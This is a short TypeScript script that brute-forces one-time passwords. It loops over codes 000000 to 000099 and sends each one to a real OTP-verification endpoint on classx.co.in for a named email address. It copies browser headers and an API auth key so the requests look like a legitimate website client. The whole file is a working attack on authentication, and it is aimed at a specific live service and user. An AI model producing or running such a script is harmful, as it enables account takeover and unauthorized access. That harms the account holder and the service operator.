import axios = require("axios");


function pad(num:number) {
  let numDigit = num == 0 ? 1 : 0;
  let numTemp = num;
  while(numTemp != 0) {
    numTemp /= 10;
    numTemp = Math.floor(numTemp);
    numDigit++;
  }

  let ans = "";
  for(let i=0; i<6-numDigit; i++) {
    ans += "0";
  }

  ans += num;
  return ans;
}

for(let i=0; i<100; i++) {
  let config = {
    method: 'get',
    maxBodyLength: Infinity,
    url: `https://harkiratapi.classx.co.in/get/otpverify?useremail=zakizaidi0709%40gmail.com&otp=${pad(i)}&mydeviceid=&mydeviceid2=`,
    headers: { 
      'sec-ch-ua-platform': '"macOS"', 
      'Referer': 'https://harkirat.classx.co.in/', 
      'Device-Type': '', 
      'sec-ch-ua': '"Not;A=Brand";v="99", "Google Chrome";v="139", "Chromium";v="139"', 
      'sec-ch-ua-mobile': '?0', 
      'Auth-Key': 'appxapi', 
      'source': 'website', 
      'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36', 
      'Client-Service': 'Appx'
    }
  };
  axios.request(config)
  .then((response) => {
    console.log(JSON.stringify(response.data));
  })
  .catch((error) => {
    console.log(error);
  })
}

;
